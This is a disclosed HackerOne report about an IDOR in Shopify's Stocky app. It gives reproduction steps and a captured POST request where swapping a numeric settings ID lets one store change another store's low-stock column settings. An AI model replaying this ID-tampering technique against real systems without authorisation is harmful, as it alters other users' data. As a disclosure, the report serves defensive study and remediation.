---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '853130'
original_report_id: '853130'
title: IDOR on stocky application-Low Stock-Varient-Settings-Columns
weakness: Insecure Direct Object Reference (IDOR)
team_handle: shopify
created_at: '2020-04-18T21:17:48.882Z'
disclosed_at: '2020-07-14T21:18:06.452Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 9
asset_identifier: Shopify Developed Apps
asset_type: OTHER
max_severity: medium
tags:
- hackerone
- insecure-direct-object-reference-idor
---

# IDOR on stocky application-Low Stock-Varient-Settings-Columns

## Metadata

- HackerOne Report ID: 853130
- Weakness: Insecure Direct Object Reference (IDOR)
- Program: shopify
- Disclosed At: 2020-07-14T21:18:06.452Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello,
I have found a IDOR on stocky application Low Stock-Varient-Settings-Columns attribute, in fact malicious user can change the columns of another user.

POC:
1)Create two user A and B, login to A and create a store, test.myshopify.com login to user B and create a store test1.myshopify.com

2)Install stocky application on both the store.

3)Go to user A store and click stocky applicaton and that will take you to https://app.stockyhq.com/ and go to https://app.stockyhq.com/dashboard/ and click low stock variants.

4) Go to settings and lick Columns and change the columns settings and turn on the burpsuite and click update, you will recieve below packet.

POST /settings_for_low_stock_variants/111111 HTTP/1.1
Host: app.stockyhq.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://app.stockyhq.com/dashboard/low_stock
Content-Type: application/x-www-form-urlencoded
Content-Length: 968
Origin: https://app.stockyhq.com
Connection: close
Cookie: 
utf8=%E2%9C%93&_method=put&authenticity_token=HlhsW6AETAE9Mi7pLqJY%2FdE4jVWu53pNWFrVhkhLcoWuT%2FwBK6c2TDrvxWDZiRDRvwaw3DoXzZ7gAatGF4sRww%3D%3D&settings_for_low_stock_variant%5Bshow_grade%5D=0&settings_for_low_stock_variant%5Bshow_product_title%5D=0&settings_for_low_stock_variant%5Bshow_variant_title%5D=0&settings_for_low_stock_variant%5Bshow_sku%5D=0&settings_for_low_stock_variant%5Bshow_lost_per_day%5D=0&settings_for_low_stock_variant%5Bshow_reorder_point%5D=0&settings_for_low_stock_variant%5Bshow_lead_time%5D=0&settings_for_low_stock_variant%5Bshow_need%5D=0&settings_for_low_stock_variant%5Bshow_depletion_days%5D=0&settings_for_low_stock_variant%5Bshow_depletion_date%5D=0&settings_for_low_stock_variant%5Bshow_next_due_date%5D=0&settings_for_low_stock_variant%5Bshow_stock%5D=0&settings_for_low_stock_variant%5Bshow_on_po%5D=0&settings_for_low_stock_variant%5Bshow_on_order%5D=0&settings_for_low_stock_variant%5Bshow_shopify_products_only%5D=0&commit=Update

5) Replace the variants id with user B store variants id the POST request as below.

POST /settings_for_low_stock_variants/111112 HTTP/1.1


6)Send it and you can see 302 message.

7)Go to user B and look at the columns in low variants stock and you can see that the change took in place.


NB: Please find the video POC

## Impact

This is a IDOR, make sure to put in place controls

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
